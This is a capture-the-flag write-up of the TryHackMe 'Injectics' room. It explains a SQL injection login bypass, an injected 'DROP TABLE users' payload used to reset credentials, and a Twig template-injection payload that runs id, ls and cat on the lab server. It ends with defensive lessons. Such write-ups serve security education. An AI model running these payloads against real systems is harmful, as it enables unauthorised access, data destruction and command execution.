# TryHackMe Write-Up: Injectics

**Challenge Name:** Injectics
**Category:** Web Injection (SQLi + SSTI)
**Difficulty:** Medium
**Platform:** TryHackMe
**Room Link:** https://tryhackme.com/room/injectics

## Overview

Injectics is a medium-difficulty web challenge that chains together two classic injection vulnerabilities: **SQL Injection (SQLi)** and **Server-Side Template Injection (SSTI)**. The room walks through exploiting a login bypass, escalating privileges by destroying and resetting a database table, and finally achieving Remote Code Execution (RCE) via a Twig template engine vulnerability to read the final flag.

**Target IP:** `10.48.151.81`

![Starting the Machine](images/starting-machine.png)



## Reconnaissance

### Inspecting the Web Application

Upon navigating to the target in a browser, we inspect the page source. Hidden inside HTML comments, two notable clues are revealed:

![Website Overview](images/website-overview.png)



![Inspect Source Comments](images/inspect-code.png)

These comments disclose:
1. A developer email address: `dev@injectics.thm`
2. The existence of a mail log file accessible at `/mail.log`

### Reading mail.log
![mail.log Contents](images/mail.log.png)
Navigating to `http://10.48.151.81/mail.log` reveals a plaintext email exchange between the developer and the super admin. The critical excerpt reads:

> *"I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. The service runs every minute."*

The email also conveniently exposes those default credentials:

| Email | Password |
|---|---|
| `superadmin@injectics.thm` | `superSecurePasswd101` |
| `dev@injectics.thm` | `devPasswd123` |



This is a significant finding — it tells us that **if we can drop the `users` table, the service will automatically recreate it with these known credentials**, giving us a path to super admin access.



## Stage 1 — SQL Injection Login Bypass

### Capturing the Login Request

On the login page, we submit a test request with dummy credentials and capture it in **Burp Suite**. This gives us visibility into the POST parameters:

![Login Page](images/log-in-page.png)

```
username=admin&password=admin&function=login
```



### Crafting the Injection Payload

The `username` parameter is vulnerable to SQL injection. We craft a payload that uses a logical `OR` to make the `WHERE` clause always evaluate to true, then comment out the rest of the query:

```
username=admin' || 1=1; -- +&password=admin&function=login
```
![Captured Login Request in Burp Suite](images/sent-by-intruder.png)
**How it works:**
- `'` — closes the string literal in the SQL query
- `|| 1=1` — appends an always-true condition using the OR operator
- `; -- -` — terminates the statement and comments out anything that follows (such as the password check)

We send this modified request through Burp Suite's **Repeater** tab. After disabling the proxy intercept, the browser redirects us into the application — authenticated as an admin user.

![Logged in as Admin](images/login-as-admin.png)



## Stage 2 — Privilege Escalation via DROP TABLE

### Discovering the Leaderboard Edit Function

Once logged in as the admin, we discover an editable leaderboard panel with form fields for Gold, Silver, and Bronze entries. These fields are passed directly into database queries and are also injectable.

### Dropping the Users Table

Recalling the information from `mail.log`, the goal is to **destroy the `users` table** so the background service repopulates it with the known default credentials. We inject the following payload into each of the leaderboard form fields:

```sql
'; DROP TABLE users; --
```

**How it works:**
- `'` — closes the current SQL string context
- `; DROP TABLE users;` — injects a second SQL statement that deletes the `users` table entirely
- `--` — comments out any remaining SQL to prevent syntax errors

![DROP TABLE Payload in Leaderboard Fields](images/droping-table.png)

![DROP TABLE Executed Successfully](images/droping-table-2.png)

After submitting, the query executes and the `users` table is dropped. Within approximately one minute, the background Injectics service detects the missing table and recreates it, inserting the default credentials from the email.

### Logging in as Super Admin

We navigate back to the login page and authenticate using:

- **Email:** `superadmin@injectics.thm`
- **Password:** `superSecurePasswd101`

![Logged in as Super Admin](images/login-as-super-admin.png)

This grants us super admin access, and the **first flag** is displayed on the dashboard.

![First Flag](images/first-flag.png)

> ✅ **Flag 1 found.**


## Stage 3 — Server-Side Template Injection (SSTI) → RCE

### Identifying the Injection Point

In the super admin panel, there is a **"Profile"** section. The application displays a personalised welcome message using the user's first name, rendered as:

```
Welcome, {username}
```

This pattern is characteristic of a **template engine rendering user-supplied input**, which is a prime candidate for SSTI.

### Confirming SSTI

We update the first name field to the classic SSTI probe:

```
{{7*7}}
```

![SSTI Probe Payload in Profile](images/checking-ssti.png)

After saving, the welcome message on the home page renders as:

```
Welcome, 49
```

![SSTI Confirmed on Home Page](images/ssti-varified.png)

The expression was **evaluated server-side**, confirming that SSTI is present.

### Identifying the Template Engine

To determine which template engine is in use, we use a well-known polyglot probe. Jinja2 (Python) and Twig (PHP) behave differently when multiplying an integer by a string:

```
{{7*'7'}}
```

- **Jinja2** would render: `7777777` (repeats the string 7 times)
- **Twig** would render: `49` (performs arithmetic multiplication)

![Twig Fingerprint Payload](images/check-twag-ssti.png)

![Twig Confirmed on Home Page](images/ssti-varified.png)

The output was `49`, confirming the engine is **Twig (PHP)**.

### Achieving Remote Code Execution

Twig supports filter chaining and several PHP functions can be abused for code execution. After testing multiple payloads, the following Twig RCE payload is confirmed to work:

```
{{['id','']|sort('passthru')}}
```

**How it works:**
- `['id','']` — creates an array with the OS command as the first element
- `|sort('passthru')` — passes each element of the array through PHP's `passthru()` function, which executes OS commands and outputs the result directly

![RCE Payload Applied](images/id-command.png)

![RCE Output on Home Page](images/id-command-output.png)

The output on the home page confirms code execution, showing the result of the `id` command (e.g., `uid=33(www-data)`).

### Enumerating the File System

We use the same payload structure to list files in the web root:

```
{{['ls','']|sort('passthru')}}
```

![ls Payload Applied](images/ls-command.png)

![ls Output on Home Page](images/ls-command-output.png)

The output reveals a directory named `/flags`. We then list its contents:

```
{{['ls ./flags','']|sort('passthru')}}
```

![ls flags Payload Applied](images/ls-in-flags-dir.png)

![ls flags Output on Home Page](images/ls-in-flag-dir-output.png)

This shows a file: `5d8af1dc14503c7e4bdc8e51a3469f48.txt`

### Reading the Final Flag

We read the file with:

```
{{['cat ./flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt','']|sort('passthru')}}
```

![cat Flag Payload Applied](images/cat-txt-for-flag.png)

![Second Flag on Home Page](images/second-flag.png)

The second and final flag is printed on the home page.

> ✅ **Flag 2 found.**



## Summary

| Step | Technique | Result |
|---|---|---|
| Source code review | HTML comment disclosure | Found `mail.log` path and developer email |
| Read `mail.log` | Information disclosure | Obtained default credentials + DROP TABLE strategy |
| Login bypass | SQL Injection (`OR 1=1`) | Authenticated as admin |
| Privilege escalation | SQL Injection (`DROP TABLE`) | Reset user table with known default creds |
| Super admin login | Credential reuse | Logged in as `superadmin`, got Flag 1 |
| Profile field | SSTI probe (`{{7*7}}`) | Confirmed server-side template evaluation |
| Engine fingerprinting | `{{7*'7'}}` polyglot | Identified Twig (PHP) |
| RCE | Twig `passthru()` filter abuse | Arbitrary OS command execution |
| File enumeration | `ls` via RCE | Located `flags/` directory |
| Flag extraction | `cat` via RCE | Obtained Flag 2 |



## Key Takeaways

- **Never expose sensitive information in HTML comments** — disclosing file paths and developer emails gives attackers a head start.
- **Never store credentials in plaintext log files** accessible via the web root.
- **Parameterised queries / prepared statements** prevent SQL injection entirely.
- **Never render raw user input through a template engine** — always sanitise or use a sandboxed context.
- **Least privilege** — the web server process should not have filesystem access beyond the web root.